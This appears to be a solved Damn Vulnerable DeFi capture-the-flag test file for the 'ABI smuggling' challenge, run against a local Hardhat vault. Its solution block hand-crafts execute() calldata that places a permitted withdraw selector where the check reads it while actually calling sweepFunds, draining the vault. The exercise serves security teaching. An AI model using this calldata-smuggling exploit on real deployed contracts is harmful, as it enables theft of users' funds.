const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;

    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player, recovery] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address);
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */

        // https://medium.com/@mattaereal/damnvulnerabledefi-abi-smuggling-challenge-walkthrough-plus-infographic-7098855d49a

        // for how to encode bytes
        // https://docs.soliditylang.org/en/latest/abi-spec.html

        data = vault.interface.encodeFunctionData("sweepFunds", [recovery.address, token.address]);

        hexLists = []
        // function selector
        hexLists.push(vault.interface.getSighash("execute"));
        // 1st argument of execute
        hexLists.push(ethers.utils.hexZeroPad(vault.address, 32));
        // offset to the start of 2nd argument
        // offset = bytes size of (1st argument, this, next dummy, withdraw selector)
        hexLists.push(ethers.utils.hexZeroPad(ethers.utils.hexValue(32 * 3 + 4), 32));
        // dummy 32 bytes for smuggling
        hexLists.push(ethers.utils.hexZeroPad(0, 32))
        // function selector (pad to the right)
        hexLists.push(vault.interface.getSighash("withdraw"))
        // size of 2nd argument
        hexLists.push(ethers.utils.hexZeroPad(ethers.utils.hexValue(ethers.utils.hexDataLength(data)), 32));
        // 2nd argument
        hexLists.push(data);

        await player.sendTransaction({
            to: vault.address,
            gasLimit: 1e6,
            data: ethers.utils.hexConcat(hexLists)
        })
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
